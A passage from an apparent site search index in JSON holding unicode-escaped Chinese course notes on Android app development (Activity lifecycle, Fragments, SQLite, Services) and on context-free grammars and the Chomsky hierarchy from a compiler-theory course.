\u80fd\u591f\u7528\u9879\u76ee\u4ee3\u7801\u5c55\u793a\u5bf9\u4e8e\u5404\u7c7b\u4f20\u611f\u5668\u7ec4\u4ef6\uff08\u9640\u87ba\u4eea\u3001\u52a0\u901f\u5ea6\u4f20\u611f\u5668\u3001\u6b65\u884c\u8ba1\u6570\u4f20\u611f\u5668\uff09\u7684\u5177\u4f53\u5e94\u7528\u3002 P 262 exp9.3","title":"1.\u590d\u4e60\u7b14\u8bb0"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%A7%BB%E5%8A%A8%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/1.%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/#_1","text":"","title":"\u79fb\u52a8\u5e94\u7528\u5f00\u53d1"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%A7%BB%E5%8A%A8%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/1.%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/#_2","text":"\u79fb\u52a8\u5e94\u7528\u5f00\u53d1 \u76ee\u5f55 \u5728Android App\u4e2d\u96c6\u6210Web\u7f51\u9875\u7684\u6b65\u9aa4\u548c\u5177\u4f53\u5b9e\u73b0\u65b9\u6cd5\u3002 P 176 exp6.1 Volley\u673a\u5236\u7684\u6982\u5ff5\u53ca\u4f7f\u7528\u6b65\u9aa4\u3002 P 218 exp7.2 Activity\u751f\u547d\u5468\u671f\u56fe\u7684\u7406\u89e3\uff0c\u5404\u72b6\u6001\u548c\u8df3\u8f6c\u5173\u7cfb\u3002 P 78 exp3.1 onCreate() : \u8fd9\u4e2a\u65b9\u6cd5\u5728\u6bcf\u4e00\u4e2aActivity\u7c7b\u90fd\u4f1a\u6709\u3002\u5f53\u6211\u4eec\u65b0\u5efa\u4e00\u4e2aActivity\u7c7b\u65f6\uff0c\u4e00\u5b9a\u4f1a\u91cd\u5199\u7236\u7c7b\u7684 onCreate\u65b9\u6cd5\u3002 onCreate()\u65b9\u6cd5\u4f1a\u5728Activity\u7b2c\u4e00\u6b21\u88ab\u521b\u5efa\u65f6\u8c03\u7528\u3002 \u6211\u4eec\u5e94\u8be5\u5728\u8fd9\u4e2a\u65b9\u6cd5\u4e2d\u5b8c\u6210Activity\u7684\u521d\u59cb\u5316\u64cd\u4f5c\uff0c\u6bd4\u5982:\u52a0\u8f7d\u5e03\u5c40\uff0c\u521d\u59cb\u5316\u5e03\u5c40\u63a7\u4ef6\uff0c\u7ed1\u5b9a\u6309\u94ae\u4e8b\u4ef6\u7b49\u3002 onStart(): \u8fd9\u4e2a\u65b9\u6cd5\u5728Activity\u7531\u4e0d\u53ef\u89c1\u53d8\u4e3a\u53ef\u89c1\u65f6\u8c03\u7528\u3002 onResume(): \u8fd9\u4e2a\u65b9\u6cd5\u5728Activity\u51c6\u5907\u597d\u548c\u7528\u6237\u4ea4\u4e92\u65f6\u8c03\u7528\u3002 \u6b64\u65f6\u7684Activity\u4e00\u5b9a\u4f4d\u4e8e\u8fd4\u56de\u6808\u7684\u6808\u9876\uff0c\u4e14\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\u3002 onRestart(): \u8fd9\u4e2a\u65b9\u6cd5\u5728Activity\u7531\u505c\u6b62\u72b6\u6001\u53d8\u4e3a\u8fd0\u884c\u72b6\u6001\u4e4b\u524d\u8c03\u7528\uff0c\u4e5f\u5c31\u662fActivity\u88ab\u91cd\u65b0\u542f\u52a8\u4e86\u3002\u63a5\u7740\u8981\u8c03\u7528onStart()\u65b9\u6cd5\u3002 onPause(): \u5f53\u7b2c\u4e00\u4e2aActivity\u901a\u8fc7Intent\u542f\u52a8\u7b2c\u4e8c\u4e2aActivity\u7684\u65f6\u5019,\u5c06\u8c03\u7528\u7b2c\u4e00\u4e2aActivity\u7684onPause()\u65b9\u6cd5; \u7136\u540e\u8c03\u7528\u7b2c\u4e8c\u4e2aActivity\u7684onCreate(),onStart(),onResume()\u65b9\u6cd5; \u63a5\u7740\u8c03\u7528\u7b2c\u4e00\u4e2aActivity\u7684onStop()\u65b9\u6cd5; onStop(): \u5f53\u7b2c\u4e00\u4e2aActivity\u88ab\u7b2c\u4e8c\u4e2aActivity\u5b8c\u5168\u8986\u76d6,\u6216\u8005\u88ab\u9500\u6bc1\u7684\u65f6\u5019\u56de\u8c03\u7528\u6b64\u65b9\u6cd5.\u5982\u679c\u6b64Activity\u8fd8\u4f1a\u4e0e\u7528\u6237\u8fdb\u884c\u4ea4\u4e92,\u5c06\u8c03\u7528onRestart\u65b9\u6cd5(); \u5982\u679c\u6b64Activity\u5c06\u88ab\u9500\u6bc1,\u90a3\u4e48\u5c06\u8c03\u7528onDestroy()\u65b9\u6cd5. onDestroy(): Activity\u88ab\u9500\u6bc1\u4e4b\u524d\u8c03\u7528\u6b64\u65b9\u6cd5.\u6216\u8005\u662f\u8c03\u7528finish()\u65b9\u6cd5\u7ed3\u675fActivity\u7684\u65f6\u5019\u8c03\u7528\u6b64\u65b9\u6cd5. \u53ef\u4ee5\u5728\u6b64\u65b9\u6cd5\u4e2d\u8fdb\u884c\u6536\u5c3e\u5de5\u4f5c,\u6bd4\u5982\u91ca\u653e\u8d44\u6e90\u7b49. \u601d\u8003\u4e00:\u5f53\u4ece\u7b2c\u4e00\u4e2aActivity\u542f\u52a8\u7b2c\u4e8c\u4e2aActivity\u7684\u65f6\u5019,\u4e3a\u4ec0\u4e48\u5148\u8c03\u7528\u7b2c\u4e00\u4e2aActivity\u7684 onPause()\u65b9\u6cd5,\u7136\u540e\u518d\u8c03\u7528\u7b2c\u4e8c\u4e2aActivity\u7684onCreate()\u7b49\u65b9\u6cd5\u5462? \u89e3\u91ca:\u5047\u5982\u6709\u8fd9\u6837\u4e00\u4e2a\u60c5\u51b5,\u4f60\u6b63\u5728\u4f7f\u7528APP\u542c\u97f3\u4e50,\u7a81\u7136\u6765\u4e86\u4e00\u4e2a\u7535\u8bdd,\u90a3\u4e48\u5f53\u7136\u9700\u8981\u5148\u6682\u505c\u97f3 \u4e50,\u7136\u540e\u8fdb\u884c\u7535\u8bdd\u7684\u5904\u7406\u3002\u6240\u4ee5\u8fd9\u5c31\u662fonPause()\u65b9\u6cd5\u7684\u4f5c\u7528:\u53ef\u4ee5\u7528\u6765\u4fdd\u5b58\u5f53\u524d\u7684\u5404\u79cd\u4fe1\u606f.\u53ef \u4ee5\u5728\u8fd9\u4e2aAPP\u7684onPause()\u65b9\u6cd5\u4e2d\u5b9e\u73b0\u6682\u505c\u97f3\u4e50\u7684\u903b\u8f91,\u7136\u540e\u518d\u5904\u7406\u7535\u8bdd\u7684\u4e1a\u52a1\u5904\u7406. \u601d\u8003\u4e8c:\u5f53\u4ece\u7b2c\u4e00\u4e2aActivity\u542f\u52a8\u7b2c\u4e8c\u4e2aActivity\u7684\u65f6\u5019,\u4e3a\u4ec0\u4e48\u7b2c\u4e00\u4e2aActivity\u7684onStop()\u65b9\u6cd5\u662f \u8c03\u7528\u5b8c\u7b2c\u4e8c\u4e2aActivity\u7684\u7cfb\u5217\u65b9\u6cd5\u540e\u624d\u8c03\u7528\u5462,\u4e3a\u4ec0\u4e48\u4e0d\u5728\u7b2c\u4e00\u4e2aActivity\u7684onPause()\u65b9\u6cd5\u4e4b\u540e\u5c31 \u8c03\u7528\u5462? \u89e3\u91ca:\u8fd9\u662f\u8c37\u6b4c\u5bf9\u5b89\u5168\u65b9\u9762\u7684\u4e00\u4e2a\u8003\u8651.\u5047\u5982\u5148\u8c03\u7528\u7b2c\u4e00\u4e2aActivity\u7684onStop()\u65b9\u6cd5,\u90a3\u4e48\u6b64\u65f6\u7b2c \u4e00\u4e2aActivity\u5c06\u4e0d\u53ef\u89c1,\u5982\u679c\u63a5\u4e0b\u6765\u8c03\u7528\u7b2c\u4e8c\u4e2aActivity\u7684\u4e00\u7cfb\u5217\u521b\u5efa\u65b9\u6cd5\u5931\u8d25\u4e86,\u90a3\u4e48\u5c31\u4f1a\u5bfc\u81f4 \u8fd9\u4e24\u4e2aActivity\u90fd\u6ca1\u663e\u793a\u5728\u5c4f\u5e55\u4e0a,\u5c31\u4f1a\u51fa\u73b0\u9ed1\u5c4f\u7b49\u4e0d\u53cb\u597d\u754c\u9762.\u5982\u679c\u662f\u8c03\u7528\u5b8c\u7b2c\u4e8c\u4e2aActivity\u4e00 \u7cfb\u5217\u521b\u5efa\u65b9\u6cd5\u540e,\u518d\u8c03\u7528\u7b2c\u4e00\u4e2aActivity\u7684onStop()\u65b9\u6cd5,\u5c31\u4f1a\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\u7684\u53d1\u751f. \u5f02\u6b65\u6d88\u606f\u5904\u7406\u673a\u5236\u7684\u6982\u5ff5\u548c\u4f7f\u7528\u6b65\u9aa4\u3002 \u89e3\u6790JSON\u6570\u636e\u7684\u5177\u4f53\u65b9\u6cd5\u3002 P 213 exp7.1 Fragment\u7684\u6982\u5ff5\u548c\u5177\u4f53\u5b9e\u73b0\u65b9\u6cd5\u3002 1/fragement \u788e\u7247(Fragment)\u662f\u4e00\u79cd\u53ef\u4ee5\u5d4c\u5165\u5728\u6d3b\u52a8\u5f53\u4e2d\u7684UI\u7247\u6bb5\uff0c\u5b83\u80fd\u8ba9\u7a0b\u5e8f\u66f4\u52a0\u5408\u7406\u548c\u5145\u5206\u5730\u5229\u7528\u5927\u5c4f \u5e55\u7684\u7a7a\u95f4\u3002 \u788e\u7247\u548cActivity\u76f8\u4f3c\uff0c\u5305\u542b\u5e03\u5c40\u9875\u9762\uff0c\u6709\u7740\u81ea\u5df1\u7684\u751f\u547d\u5468\u671f\u3002 Fragment\u6df1\u5165\u7406\u89e3 Fragment\u662f\u4f9d\u8d56\u4e8eActivity\u7684\uff0c\u4e0d\u80fd\u72ec\u7acb\u5b58\u5728\u7684\u3002 \u4e00\u4e2aActivity\u91cc\u53ef\u4ee5\u6709\u591a\u4e2aFragment\u3002 \u4e00\u4e2aFragment\u53ef\u4ee5\u88ab\u591a\u4e2aActivity\u91cd\u7528\u3002 Fragment\u6709\u81ea\u5df1\u7684\u751f\u547d\u5468\u671f\uff0c\u5e76\u80fd\u63a5\u6536\u8f93\u5165\u4e8b\u4ef6\u3002 \u6211\u4eec\u80fd\u5728Activity\u8fd0\u884c\u65f6\u52a8\u6001\u5730\u6dfb\u52a0\u6216\u5220\u9664Fragment\u3002 Fragment\u7684\u4f18\u52bf: \u6a21\u5757\u5316(Modularity):\u6211\u4eec\u4e0d\u5fc5\u628a\u6240\u6709\u4ee3\u7801\u5168\u90e8\u5199\u5728Activity\u4e2d\uff0c\u800c\u662f\u628a\u4ee3\u7801\u5199\u5728\u5404\u81ea\u7684 Fragment\u4e2d\u3002 \u53ef\u91cd\u7528(Reusability):\u591a\u4e2aActivity\u53ef\u4ee5\u91cd\u7528\u4e00\u4e2aFragment\u3002 \u53ef\u9002\u914d(Adaptability):\u6839\u636e\u786c\u4ef6\u7684\u5c4f\u5e55\u5c3a\u5bf8\u3001\u5c4f\u5e55\u65b9\u5411\uff0c\u80fd\u591f\u65b9\u4fbf\u5730\u5b9e\u73b0\u4e0d\u540c\u7684\u5e03\u5c40\uff0c\u8fd9 \u6837\u7528\u6237\u4f53\u9a8c\u66f4\u597d\u3002 \u6d88\u606f\u901a\u77e5\uff08Toast\u548cNotification\uff09\u7684\u4f7f\u7528\u65b9\u6cd5\u3002 P 64 Toast exp2.15 P 167 Notification exp5.4 Android\u5f00\u53d1\u4e2d\u7ecf\u5e38\u4f7f\u7528\u7b2c\u4e09\u65b9jar\u5305\uff0c\u5982\u767e\u5ea6\u5730\u56fe\uff0c\u652f\u4ed8\u5b9d\uff0c\u6216\u89c6\u9891\u76f4\u64ad\u7b49\u3002\u8981\u6c42\u80fd\u591f\u7528\u9879\u76ee\u4ee3\u7801\u5c55\u793a\u7b2c\u4e09\u65b9jar\u5305\u7684\u4f7f\u7528\u65b9\u5f0f\u548c\u57fa\u672c\u529f\u80fd\u8c03\u7528\u3002 P 256 Android\u5f00\u53d1\u4e2d\u5185\u7f6e\u652f\u6301Sqlite\u6570\u636e\u5e93\u3002\u80fd\u7528\u4ee3\u7801\u5c55\u793a\u5bf9\u6570\u636e\u5e93\u8868\u683c\u7684insert\uff0cupdate\uff0cselect\uff0cdelete\u7b49\u3002 P 227 exp8.2 Android\u5f00\u53d1\u4e2d\u6709Service\u53caIntent\u7b49\u6838\u5fc3\u7ec4\u4ef6\uff0c\u80fd\u7528\u9879\u76ee\u4ee3\u7801\u6f14\u793a\u5b83\u4eec\u4e24\u8005\u7ed3\u5408\u7684\u4e00\u4e2a\u5177\u4f53\u5e94\u7528\u3002 P 82 Intent P 153 Service exp5.1 \u80fd\u591f\u7528\u9879\u76ee\u4ee3\u7801\u5c55\u793a\u5bf9\u5404\u7c7b\u524d\u7aef\u5f00\u53d1\u63a7\u4ef6\u7684\u5177\u4f53\u5e94\u7528\uff0c\u5982\u590d\u5408\u6309\u94ae\u3001\u4e0b\u62c9\u6846\u3001\u65f6\u95f4\u7c7b\u63a7\u4ef6\u7b49\u3002 P 48 exp2.11 \u80fd\u591f\u7528\u9879\u76ee\u4ee3\u7801\u5c55\u793a\u5bf9\u4e8e\u5404\u7c7b\u4f20\u611f\u5668\u7ec4\u4ef6\uff08\u9640\u87ba\u4eea\u3001\u52a0\u901f\u5ea6\u4f20\u611f\u5668\u3001\u6b65\u884c\u8ba1\u6570\u4f20\u611f\u5668\uff09\u7684\u5177\u4f53\u5e94\u7528\u3002 P 262 exp9.3","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/1.%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/","text":"\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5 # \u76ee\u5f55 # \u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5 \u76ee\u5f55 1. \u80cc\u666f 2. \u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5 2.1. \u6587\u6cd5 2.2. \u8bed\u6cd5\u63cf\u8ff0\u7684\u51e0\u4e2a\u57fa\u672c\u6982\u5ff5 2.3. \u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5 2.4. \u6700\u5de6\u3001\u6700\u53f3\u63a8\u5bfc 3. \u8bed\u6cd5\u6811 4. \u4e8c\u4e49\u6027 4.1. \u6587\u6cd5\u7684\u4e8c\u4e49\u6027 4.2. \u8bed\u8a00\u7684\u4e8c\u4e49\u6027 5. \u4e54\u59c6\u65af\u57fa\u5f62\u5f0f\u8bed\u8a00\u4f53\u7cfb 5.1. \u96f6\u578b\u6587\u6cd5 5.2. \u4e00\u578b\u6587\u6cd5 5.3. \u4e8c\u578b\u6587\u6cd5 5.4. \u4e09\u578b\u6587\u6cd5 5.5. \u56db\u79cd\u7c7b\u578b\u6587\u6cd5\u63cf\u8ff0\u80fd\u529b\u6bd4\u8f83 1. \u80cc\u666f # \u8fd9\u5b66\u671f\u9009\u4e86\u300a\u7f16\u8bd1\u539f\u7406\u300b\u8fd9\u95e8\u8bfe\uff0c\u53d1\u73b0 \u9ad8\u7ea7\u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00\u7684\u8bed\u6cd5\u63cf\u8ff0 \u8fd9\u90e8\u5206\u4e2d\uff0c\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5\u548c\u56db\u79cd\u4e0d\u540c\u7c7b\u578b\u7684\u6587\u6cd5\u8fd9\u4e9b\u5185\u5bb9\u6bd4\u8f83\u590d\u6742\u3002\u4e8e\u662f\u6211\u53c2\u8003\u4e2d\u56fd\u5927\u5b66MOOC- \u56fd\u9632\u79d1\u6280\u5927\u5b66\u300a\u7f16\u8bd1\u539f\u7406\u300b \u7684PPT\uff0c\u6574\u7406\u4e86\u8fd9\u4e00\u7ae0\u7684\u5185\u5bb9\uff0c\u5e0c\u671b\u80fd\u591f\u7406\u89e3\u8fd9\u90e8\u5206\u7684\u77e5\u8bc6\u3002 2. \u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5 # 2.1. \u6587\u6cd5 # \u6587\u6cd5 \u5b9a\u4e49\uff1a\u63cf\u8ff0\u8bed\u8a00\u7684\u8bed\u6cd5\u7ed3\u6784\u7684\u5f62\u5f0f\u89c4\u5219\uff08\u5373\u8bed\u6cd5\u89c4\u5219\uff09 \u4e3e\u4f8b\uff1a<\u53e5\u5b50> \u2192 <\u4e3b\u8bed><\u8c13\u8bed><\u95f4\u63a5\u5bbe\u8bed><\u76f4\u63a5\u5bbe\u8bed> \u63a8\u5bfc\u51faHe gave me a book. 2.2. \u8bed\u6cd5\u63cf\u8ff0\u7684\u51e0\u4e2a\u57fa\u672c\u6982\u5ff5 # \u5b57\u6bcd\u8868 \uff1a\u4e00\u4e2a\u6709\u7a77\u5b57\u7b26\u96c6\uff0c\u8bb0\u4e3a \\Sigma \u5b57\u7b26 \uff1a\u5b57\u6bcd\u8868\u4e2d\u6bcf\u4e2a\u5143\u7d20\u79f0\u4e3a\u5b57\u7b26 \u5b57\uff08\u5b57\u7b26\u4e32\uff09 \uff1a\u7531 \\Sigma \u4e2d\u7684\u5b57\u7b26\u6240\u6784\u6210\u7684\u4e00\u4e2a\u6709\u7a77\u5e8f\u5217 \u7a7a\u5b57 \uff1a\u4e0d\u5305\u542b\u4efb\u4f55\u5b57\u7b26\u7684\u5e8f\u5217\u79f0\u4e3a\u7a7a\u5b57\uff0c\u8bb0\u4e3a \\epsilon \u5b57\u7684\u5168\u4f53 \uff1a \u7528 \\Sigma^* \u8868\u793a \\Sigma \u4e0a\u7684\u6240\u6709\u5b57\u7684\u5168\u4f53\uff0c\u5305\u542b\u7a7a\u5b57 \\epsilon \u8fde\u63a5\uff08\u79ef\uff09 \uff1a \\Sigma^* \u7684\u5b50\u96c6 U \u548c V \u7684\u8fde\u63a5\uff08\u79ef\uff09\u5b9a\u4e49\u4e3a UV \uff1d \\{ \\alpha \\beta | \\alpha \\in U \\& \\beta \\in V\\} \\tag{1} \u95ed\u5305 \uff1a V^* \u662f V \u7684\u95ed\u5305 V^* = V^0 \\bigcup V^1 \\bigcup V^2 \\bigcup V^3 \\bigcup \\cdots \\tag{2} \u95ed\u5305\u5305\u542b V^0 = \\epsilon \u6b63\u89c4\u95ed\u5305 \uff1a V^+ \u662f V \u7684\u6b63\u89c4\u95ed\u5305\uff1a V^+\uff1dV V^* \\tag{3} \u6b63\u89c4\u95ed\u5305\u4e0d\u542b \\epsilon 2.3. \u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5 # \u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5G\u662f\u4e00\u4e2a\u56db\u5143\u7ec4 G=(V_T\uff0cV_N\uff0cS\uff0cP) \\tag{4} \u5176\u4e2d V_T \uff1a\u7ec8\u7ed3\u7b26\uff08Terminal\uff09\u96c6\u5408(\u975e\u7a7a) V_N \uff1a\u975e\u7ec8\u7ed3\u7b26\uff08Noterminal\uff09\u96c6\u5408\uff08\u975e\u7a7a\uff09\uff0c\u4e14 V_T \\bigcap V_N = \\varnothing S \uff1a\u6587\u6cd5\u7684\u5f00\u59cb\u7b26\u53f7\uff0c S \\in V_N P \uff1a\u4ea7\u751f\u5f0f\u96c6\u5408(\u6709\u9650)\uff0c\u6bcf\u4e2a\u4ea7\u751f\u5f0f\u5f62\u5f0f\u4e3a P \\to \\alpha {\\hspace*{0.5cm}} P \\in V_N {\\hspace*{0.5cm}} \\alpha \\in (V_T \\bigcup V_N)^* \\tag{5} \u5f00\u59cb\u7b26 S \u81f3\u5c11\u5fc5\u987b\u5728\u67d0\u4e2a\u4ea7\u751f\u5f0f\u7684\u5de6\u90e8\u51fa\u73b0\u4e00\u6b21\u3002 2.4. \u6700\u5de6\u3001\u6700\u53f3\u63a8\u5bfc # \u6700\u5de6\u63a8\u5bfc \u5b9a\u4e49\uff1a\u4efb\u4f55\u4e00\u6b65 \\alpha \\Rightarrow \\beta \u90fd\u662f\u5bf9 \\alpha \u4e2d\u7684\u6700\u5de6\u975e\u7ec8\u7ed3\u7b26\u8fdb\u884c\u66ff\u6362 \u6700\u53f3\u63a8\u5bfc \u5b9a\u4e49\uff1a\u4efb\u4f55\u4e00\u6b65 \\alpha \\Rightarrow \\beta \u90fd\u662f\u5bf9 \\alpha \u4e2d\u7684\u6700\u53f3\u975e\u7ec8\u7ed3\u7b26\u8fdb\u884c\u66ff\u6362 3. \u8bed\u6cd5\u6811 # \u8bed\u6cd5\u6811 \uff1a\u7528\u4e00\u5f20\u56fe\u8868\u793a\u4e00\u4e2a\u53e5\u578b\u7684\u63a8\u5bfc,\u79f0\u4e3a\u8bed\u6cd5\u6811\u3002 \u4e00\u68f5\u8bed\u6cd5\u6811\u662f\u4e0d\u540c\u63a8\u5bfc\u8fc7\u7a0b\u7684\u5171\u6027\u62bd\u8c61\uff0c\u4e00\u68f5\u8bed\u6cd5\u6811\u53ef\u4ee5\u5bf9\u5e94\u591a\u4e2a\u4e0d\u540c\u7684\u63a8\u5bfc\u8fc7\u7a0b\u3002 4. \u4e8c\u4e49\u6027 # 4.1. \u6587\u6cd5\u7684\u4e8c\u4e49\u6027 # \u6587\u6cd5\u7684\u4e8c\u4e49\u6027 \uff1a\u5982\u679c\u4e00\u4e2a\u6587\u6cd5\u5b58\u5728\u67d0\u4e2a\u53e5\u5b50\u5bf9\u5e94\u4e24\u68f5\u4e0d\u540c\u7684\u8bed\u6cd5\u6811\uff0c\u5219\u8bf4\u8fd9\u4e2a\u6587\u6cd5\u662f\u4e8c\u4e49\u7684 4.2. \u8bed\u8a00\u7684\u4e8c\u4e49\u6027 # \u8bed\u8a00\u7684\u4e8c\u4e49\u6027 \uff1a\u4e00\u4e2a\u8bed\u8a00\u662f\u4e8c\u4e49\u7684\uff0c\u5982\u679c\u5bf9\u5b83\u4e0d\u5b58\u5728\u65e0\u4e8c\u4e49\u7684\u6587\u6cd5 5. \u4e54\u59c6\u65af\u57fa\u5f62\u5f0f\u8bed\u8a00\u4f53\u7cfb # \u56db\u79cd\u7c7b\u578b\u7684\u6587\u6cd5\u4e5f\u90fd\u7531\u56db\u90e8\u5206\u7ec4\u6210 G=(V_T\uff0cV_N\uff0cS\uff0cP) \\tag{6} \u5176\u4e2d V_T \uff1a\u7ec8\u7ed3\u7b26\uff08Terminal\uff09\u96c6\u5408(\u975e\u7a7a) V_N \uff1a\u975e\u7ec8\u7ed3\u7b26\uff08Noterminal\uff09\u96c6\u5408\uff08\u975e\u7a7a\uff09\uff0c\u4e14 V_T \\bigcap V_N = \\varnothing S \uff1a\u6587\u6cd5\u7684\u5f00\u59cb\u7b26\u53f7\uff0c S \\in V_N P \uff1a\u4ea7\u751f\u5f0f\u96c6\u5408(\u6709\u9650)\uff0c\u6bcf\u4e2a\u4ea7\u751f\u5f0f\u5f62\u5f0f\u4e3a P \\to \\alpha {\\hspace*{0.5cm}} P \\in V_N {\\hspace*{0.5cm}} \\alpha \\in (V_T \\bigcup V_N)^* \\tag{7} 5.1. \u96f6\u578b\u6587\u6cd5 # 0\u578b\u6587\u6cd5 \uff08\u77ed\u8bed\u6587\u6cd5\uff0c\u56fe\u7075\u673a\uff09 \u4ea7\u751f\u5f0f\u5f62\u5982\uff1a \\alpha \\to \\beta \u5176\u4e2d\uff1a \\alpha \\in (V_T \\bigcup V_N)^* \u4e14\u81f3\u5c11\u542b\u6709\u4e00\u4e2a\u975e\u7ec8\u7ed3\u7b26 \\beta \\in (V_T \\bigcup V_N)^* \u8bf4\u660e \uff1a\u5bf9 \\alpha \u548c \\beta \u8303\u56f4\u57fa\u672c\u6ca1\u6709\u9650\u5236\uff0c\u8981\u6c42 \\alpha \uff08\u5373\u4ea7\u751f\u5f0f\u5de6\u8fb9\uff09\u81f3\u5c11\u6709\u4e00\u4e2a\u975e\u7ec8\u7ed3\u7b26 5.2. \u4e00\u578b\u6587\u6cd5 # 1\u578b\u6587\u6cd5 (\u4e0a\u4e0b\u6587\u6709\u5173\u6587\u6cd5\uff0c\u7ebf\u6027\u754c\u9650\u81ea\u52a8\u673a) \u4ea7\u751f\u5f0f\u5f62\u5982\uff1a \\alpha \\to \\beta \u5176\u4e2d\uff1a |\\alpha| \u2264 |\\beta| \uff0c\u4ec5 S \\to \\epsilon \u4f8b\u5916 \u8bf4\u660e \uff1a\u8981\u6c42 \\alpha \uff08\u4ea7\u751f\u5f0f\u5de6\u8fb9\uff09\u957f\u5ea6\u5c0f\u4e8e\u53f3\u8fb9\uff0c\u9664\u5f00\u59cb\u7b26\u53f7\u76f4\u63a5\u63a8\u5bfc\u51fa\u7a7a\u5b57\u4ee5\u5916 5.3. \u4e8c\u578b\u6587\u6cd5 # 2\u578b\u6587\u6cd5 (\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5\uff0c\u975e\u786e\u5b9a\u4e0b\u63a8\u81ea\u52a8\u673a) \u4ea7\u751f\u5f0f\u5f62\u5982\uff1a A \\to B \u5176\u4e2d\uff1a A \\in V_N \\beta \\in (V_T \\bigcup V_N)^* \u8bf4\u660e \uff1a\u8981\u6c42 A \uff08\u5373\u4ea7\u751f\u5f0f\u5de6\u8fb9\uff09\u4e00\u5b9a\u90fd\u662f\u975e\u7ec8\u7ed3\u7b26 5.4. \u4e09\u578b\u6587\u6cd5 # 3\u578b\u6587\u6cd5 (\u6b63\u89c4\u6587\u6cd5\uff0c\u6709\u9650\u81ea\u52a8\u673a) \u53f3\u7ebf\u6027\u6587\u6cd5 \u4ea7\u751f\u5f0f\u5f62\u5982\uff1a A \\to \\alpha B \u6216 A \\to \\alpha \u5176\u4e2d\uff1a \\alpha \\in V_T^* A, B \\in V_N \u5de6\u7ebf\u6027\u6587\u6cd5 \u4ea7\u751f\u5f0f\u5f62\u5982\uff1a A \\to B\\alpha \u6216 A \\to \\alpha \u5176\u4e2d\uff1a \\alpha \\in V_T^* A, B \\in V_N \u8bf4\u660e \uff1a \u53f3\u7ebf\u6027\u6587\u6cd5\uff1a\u4ea7\u751f\u5f0f\u4e3a\u63a8\u5bfc\u505c\u6b62\u6216\u5411\u53f3\u6269\u5c55\uff0c\u5bf9\u53f3\u7aef\u8fdb\u884c\u9012\u5f52\uff0c\u4fdd\u8bc1\u5de6\u4fa7\u59cb\u7ec8\u4e3a\u7ec8\u7ed3\u7b26\u3002 \u5de6\u7ebf\u6027\u6587\u6cd5\uff1a\u4ea7\u751f\u5f0f\u4e3a\u63a8\u5bfc\u505c\u6b62\u6216\u5411\u5de6\u6269\u5c55\uff0c\u5bf9\u5de6\u7aef\u8fdb\u884c\u9012\u5f52\uff0c\u4fdd\u8bc1\u53f3\u4fa7\u59cb\u7ec8\u4e3a\u7ec8\u7ed3\u7b26\u3002 5.5. \u56db\u79cd\u7c7b\u578b\u6587\u6cd5\u63cf\u8ff0\u80fd\u529b\u6bd4\u8f83 # 0\u578b > 1\u578b > 2\u578b > 3\u578b \u6ce8\uff1a\u90e8\u5206\u5185\u5bb9\u6574\u7406\u81ea\u4e2d\u56fd\u5927\u5b66MOOC- \u56fd\u9632\u79d1\u6280\u5927\u5b66\u300a\u7f16\u8bd1\u539f\u7406\u300b PPT \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/1.%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/#_1","text":"","title":"\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/1.%E4%B8%8A%E4%B8%8B%E6%96%87%E6%97%A0%E5%85%B3%E6%96%87%E6%B3%95/#_2","text":"\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5 \u76ee\u5f55 1. \u80cc\u666f 2. \u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5 2.1. \u6587\u6cd5 2.2. \u8bed\u6cd5\u63cf\u8ff0\u7684\u51e0\u4e2a\u57fa\u672c\u6982\u5ff5 2.3. \u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5 2.4. \u6700\u5de6\u3001\u6700\u53f3\u63a8\u5bfc 3. \u8bed\u6cd5\u6811 4. \u4e8c\u4e49\u6027 4.1. \u6587\u6cd5\u7684\u4e8c\u4e49\u6027 4.2. \u8bed\u8a00\u7684\u4e8c\u4e49\u6027 5. \u4e54\u59c6\u65af\u57fa\u5f62\u5f0f\u8bed\u8a00\u4f53\u7cfb 5.1. \u96f6\u578b\u6587\u6cd5 5.2. \u4e00\u578b\u6587\u6cd5 5.3. \u4e8c\u578b\u6587\u6cd5 5.4. \u4e09\u578b\u6587\u6cd5 5.5. 